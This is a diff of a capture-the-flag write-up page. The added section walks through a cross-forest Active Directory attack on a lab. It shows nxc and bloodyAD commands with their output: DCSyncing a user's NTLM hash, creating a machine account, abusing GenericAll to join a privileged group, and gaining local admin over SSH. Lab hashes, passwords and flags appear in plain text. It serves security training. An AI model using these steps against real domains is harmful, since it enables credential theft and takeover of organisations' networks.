@@ -21,7 +21,7 @@
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-09-07T00:00:00-04:00","datePublished":"2025-09-07T00:00:00-04:00","headline":"Range Village CTF, September 2025","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/rv-sept.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://0.0.0.0:4000/rv-sept.html"}</script>
 <!-- End Jekyll SEO tag -->
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=29cdead46ab01c197b0274d6a90a38fc2348444f">
+    <link rel="stylesheet" href="/assets/css/style.css?v=75d6e3e17dd82047b78802147b2893447a331b11">
     <!--[if lt IE 9]>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
     <![endif]-->
@@ -732,6 +732,11 @@
   <li><a href="#flag-7-privilege-deescalation">Flag 7: Privilege (De)escalation?</a>
     <ul>
       <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+      <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
+      <li><a href="#dcsyncing-natashalim">DCSyncing natasha.lim</a></li>
+      <li><a href="#foreign-maq">Foreign MAQ</a></li>
+      <li><a href="#abusing-genericall-on-group-again">Abusing GenericAll on Group, again</a></li>
+      <li><a href="#local-administrator">Local Administrator</a></li>
     </ul>
   </li>
 </ul>
@@ -805,6 +810,10 @@
       </ul>
       <li>
         <a href="#flag-7-privilege-deescalation">Privilege (De)escalation?</a>
+        <ul>
+          <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
+          <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
+        </ul>
       </li>
     </ol>
   </div>
@@ -1346,7 +1355,7 @@ RV{lA7ERAl_m0vemenT_I5_a1SO_cOoL_3c69d6d47771c7d7671a5bf3c058e326}
 
 <h1 id="flag-4-historical-scar">Flag 4: Historical Scar</h1>
 
-<p><img src="./assets/img/rv-sept/4.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/4.png" alt="" /></p>
 
 <p>After obtaining access to <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>, as <code class="language-plaintext highlighter-rouge">wei.jie.tan</code>, we can find the path to the user’s PowerShell history file by running the following command.</p>
 
@@ -1381,7 +1390,7 @@ cat (Get-PSReadlineOption).HistorySavePath
 
 <h1 id="flag-5-silver">Flag 5: Silver</h1>
 
-<p><img src="./assets/img/rv-sept/5.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/5.png" alt="" /></p>
 
 <p>This flag was (as intended) found to be the most challenging, with only 3 participants solving it during the meetup. There are also a few different ways to solve this challenge, and we’ll be covering all of them here.</p>
 
@@ -1459,11 +1468,11 @@ SQL (antennae\chloe.lim  guest@master)&gt;
 
 <p>While performing this authentication, we can inspect the network traffic and find the corresponding <code class="language-plaintext highlighter-rouge">TGS-REQ</code> and <code class="language-plaintext highlighter-rouge">TGS-REP</code> packets. These are part of the <code class="language-plaintext highlighter-rouge">TGS</code> exchange in the <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol, where the client (us!) requests for a service ticket to access a specific service (in this case, the <code class="language-plaintext highlighter-rouge">MSSQL</code> service on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code>).</p>
 
-<p><img src="./assets/img/rv-sept/tgs.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/tgs.png" alt="" /></p>
 
 <p>In the <code class="language-plaintext highlighter-rouge">TGS-REQ</code> packet, we find that we are requesting a service ticket for the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN:</p>
 
-<p><img src="./assets/img/rv-sept/tgsreq.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/tgsreq.png" alt="" /></p>
 
 <blockquote>
   <p>For a detailed explanation on the <code class="language-plaintext highlighter-rouge">sname-string</code> structure, and how it is parsed into the <code class="language-plaintext highlighter-rouge">MSSQLSvc/sql01.antennae.rv</code> SPN, please refer to <a href="https://github.com/ASYNC-Security/W200-Preview-Public?tab=readme-ov-file#service-principal-name-who">our public preview</a> which navigates the <a href="https://datatracker.ietf.org/doc/html/rfc4120#section-5.4.1">RFC 4120, Section 5.4.1</a> - <code class="language-plaintext highlighter-rouge">KDC-REQ</code> and <code class="language-plaintext highlighter-rouge">KDC-REQ-BODY</code> structures.</p>
@@ -1471,7 +1480,7 @@ SQL (antennae\chloe.lim  guest@master)&gt;
 
 <p>As you’d expect, the <code class="language-plaintext highlighter-rouge">TGS-REP</code> packet contains the encrypted service ticket that we requested:</p>
 
-<p><img src="./assets/img/rv-sept/tgsrep.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/tgsrep.png" alt="" /></p>
 
 <p>As per <a href="https://datatracker.ietf.org/doc/html/rfc4120#section-5.3">RFC 4120, Section 5.3</a>, the <code class="language-plaintext highlighter-rouge">ticket</code> structure returned in the <code class="language-plaintext highlighter-rouge">KDC-REP</code> message is defined as follows:</p>
 
@@ -1917,7 +1926,7 @@ antennae\svc_sql
 
 <h1 id="flag-6-antennae">Flag 6: Antennae</h1>
 
-<p><img src="./assets/img/rv-sept/6.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/6.png" alt="" /></p>
 
 <p>Finally, with local <code class="language-plaintext highlighter-rouge">SYSTEM</code> access on <code class="language-plaintext highlighter-rouge">sql01.antennae.rv</code> - we can obtain credentials from logged on users by dumping the <a href="https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before"><code class="language-plaintext highlighter-rouge">LSASS</code></a> process. This allows us to steal <code class="language-plaintext highlighter-rouge">NTLM</code> hashes of users that have previously logged into the machine.</p>
 
@@ -1973,7 +1982,7 @@ LDAP        10.5.10.10      389    DC01             [+] antennae.rv\kai.wen.goh:
 
 <p>On <code class="language-plaintext highlighter-rouge">BloodHound</code>, we find that the <code class="language-plaintext highlighter-rouge">kai.wen.goh</code> user is a member of the <code class="language-plaintext highlighter-rouge">Domain Admins</code> group - which is a member of the <code class="language-plaintext highlighter-rouge">Administrators</code> group on <code class="language-plaintext highlighter-rouge">dc01.antennae.rv</code>.</p>
 
-<p><img src="./assets/img/rv-sept/bh6.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/bh6.png" alt="" /></p>
 
 <h2 id="dcsync-attack">DCSync Attack</h2>
 
@@ -2011,7 +2020,7 @@ RV{aNd_The_Pil1@r$_st@rt_dROpp!nG_170fee6a4def44375b5c5ecbc0b87efe}
 
 <h1 id="flag-7-privilege-deescalation">Flag 7: Privilege (De)escalation?</h1>
 
-<p><img src="./assets/img/rv-sept/7.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/7.png" alt="" /></p>
 
 <p>This challenge, sadly, only had one solve. This flag is the first challenge in the <code class="language-plaintext highlighter-rouge">backward.rv</code> forest, which has a <a href="https://www.thehacker.recipes/ad/movement/trusts/">bidirectional trust</a> with the compromised <code class="language-plaintext highlighter-rouge">antennae.rv</code> forest.</p>
 
@@ -2045,7 +2054,94 @@ INFO: Compressing output into 20250907125945_bloodhound.zip
 
 <p>After ingesting this data into <code class="language-plaintext highlighter-rouge">BloodHound</code>, we can now see the <code class="language-plaintext highlighter-rouge">backward.rv</code> forest in the <code class="language-plaintext highlighter-rouge">BloodHound</code> interface.</p>
 
-<p><img src="./assets/img/rv-sept/bwbh.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/bwbh.png" alt="" /></p>
+
+<h2 id="finding-foreign-group-memberships">Finding Foreign Group Memberships</h2>
+
+<p>We can enumerate for foreign group memberships using the <code class="language-plaintext highlighter-rouge">Queries</code> tab in <code class="language-plaintext highlighter-rouge">BloodHound</code>. This is a built-in query, labelled as: <code class="language-plaintext highlighter-rouge">Principals with foreign domain group membership</code>. We’ll find that <code class="language-plaintext highlighter-rouge">natasha.lim@antennae.rv</code> is a member of the <code class="language-plaintext highlighter-rouge">Maintainers</code> group in <code class="language-plaintext highlighter-rouge">backward.rv</code>.</p>
+
+<p><img src="./assets/img/rv-sept/ntlm.png" alt="" /></p>
+
+<p>Additionally, we’ll find that the <code class="language-plaintext highlighter-rouge">Maintainers</code> group has <code class="language-plaintext highlighter-rouge">GenericAll</code> permissions on the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group in <code class="language-plaintext highlighter-rouge">backward.rv</code>.</p>
+
+<p><img src="./assets/img/rv-sept/sysadmins.png" alt="" /></p>
+
+<h2 id="dcsyncing-natashalim">DCSyncing natasha.lim</h2>
+
+<p>As we did before with the <code class="language-plaintext highlighter-rouge">Administrator@antennae.rv</code> user, we can perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack to obtain the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of the <code class="language-plaintext highlighter-rouge">natasha.lim</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc01.antennae.rv -u 'kai.wen.goh' -H '56e7e432c955bfdbb8f57d1248417116' --ntds --user 'natasha.lim'
+SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.10      445    DC01             [+] antennae.rv\kai.wen.goh:56e7e432c955bfdbb8f57d1248417116 (Pwn3d!)
+SMB         10.5.10.10      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.5.10.10      445    DC01             natasha.lim:1123:aad3b435b51404eeaad3b435b51404ee:0a1bc6b13cd3106322a6d5bbb0293e44:::
+</code></pre></div></div>
+
+<h2 id="foreign-maq">Foreign MAQ</h2>
+
+<p>As we did before to enumerate the <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> on <code class="language-plaintext highlighter-rouge">antennae.rv</code>, we can do the same for <code class="language-plaintext highlighter-rouge">backward.rv</code>. Due to the bidirectional trust, we can use the credentials of any user in <code class="language-plaintext highlighter-rouge">antennae.rv</code> to query <code class="language-plaintext highlighter-rouge">backward.rv</code>. In this case, we’ll use the credentials of <code class="language-plaintext highlighter-rouge">natasha.lim</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'natasha.lim' -H '0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' -M maq
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:antennae.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] antennae.rv\natasha.lim:0a1bc6b13cd3106322a6d5bbb0293e44 
+MAQ         10.5.10.12      389    DC02             [*] Getting the MachineAccountQuota
+MAQ         10.5.10.12      389    DC02             MachineAccountQuota: 10
+</code></pre></div></div>
+
+<p>We can create a new computer account in <code class="language-plaintext highlighter-rouge">backward.rv</code>, using <code class="language-plaintext highlighter-rouge">natasha.lim</code>’s credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc02.backward.rv -u 'natasha.lim' -H '0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd' 
+SMB         10.5.10.12      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:backward.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.12      445    DC02             [+] antennae.rv\natasha.lim:0a1bc6b13cd3106322a6d5bbb0293e44 
+ADD-COMP... 10.5.10.12      445    DC02             Successfully added the machine account: "gatari$" with Password: "P@ssw0rd"
+</code></pre></div></div>
+
+<h2 id="abusing-genericall-on-group-again">Abusing GenericAll on Group, again</h2>
+
+<p>Now that we have a computer account in <code class="language-plaintext highlighter-rouge">backward.rv</code>, we can use the <code class="language-plaintext highlighter-rouge">GenericAll</code> permissions that the <code class="language-plaintext highlighter-rouge">Maintainers</code> group has on the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group to add our computer account to the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'dc02.backward.rv' -u 'natasha.lim' -p ':0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' add groupMember 'sysadmins' 'gatari$'                                          
+[+] gatari$ added to sysadmins
+</code></pre></div></div>
+
+<p>We can verify that our computer account is indeed a member of the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'gatari$' -p 'P@ssw0rd' -M whoami                                                        
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\gatari$:P@ssw0rd 
+WHOAMI      10.5.10.12      389    DC02             Name: gatari
+WHOAMI      10.5.10.12      389    DC02             sAMAccountName: gatari$
+WHOAMI      10.5.10.12      389    DC02             Enabled: Yes
+WHOAMI      10.5.10.12      389    DC02             Password Never Expires: No
+WHOAMI      10.5.10.12      389    DC02             Last logon: Never
+WHOAMI      10.5.10.12      389    DC02             Password Last Set: Never
+WHOAMI      10.5.10.12      389    DC02             Bad Password Count: 0
+WHOAMI      10.5.10.12      389    DC02             Distinguished Name: CN=gatari,CN=Computers,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             Member of: CN=Sysadmins,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             User SID: S-1-5-21-2163652167-2436585246-2491459670-1605
+</code></pre></div></div>
+
+<h2 id="local-administrator">Local Administrator</h2>
+
+<p>Now that we are part of the <code class="language-plaintext highlighter-rouge">sysadmins</code> group, we can enumerate for local administrator access on machines in the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain. We can do this with <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb srv01.backward.rv -u 'gatari$' -p 'P@ssw0rd'                                                                                                  
+SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.13      445    SRV01            [+] backward.rv\gatari$:P@ssw0rd (Pwn3d!)
+</code></pre></div></div>
+
+<p>The presence of the <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> message indicates that <code class="language-plaintext highlighter-rouge">gatari$</code> has local administrator access on <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>. This is likely because the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group is a member of the <code class="language-plaintext highlighter-rouge">Administrators</code> group on <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>. We can <code class="language-plaintext highlighter-rouge">SSH</code> into <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code> as <code class="language-plaintext highlighter-rouge">gatari$</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'P@ssw0rd' ssh 'gatari$'@srv01.backward.rv
+PS C:\Users\gatari$&gt; whoami
+backward\gatari$
+</code></pre></div></div>
+
+<p>And grab <code class="language-plaintext highlighter-rouge">flag7.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\gatari$&gt; cat C:\Users\Administrator\Desktop\flag7.txt
+RV{f0r3I6n_GRoUP_mEMBeRSH1p_!$_pR3t7Y_4nNoyin9_549d3e2a7fd475283f4ce5f93f489a76}
+</code></pre></div></div>
 
 
 <script>
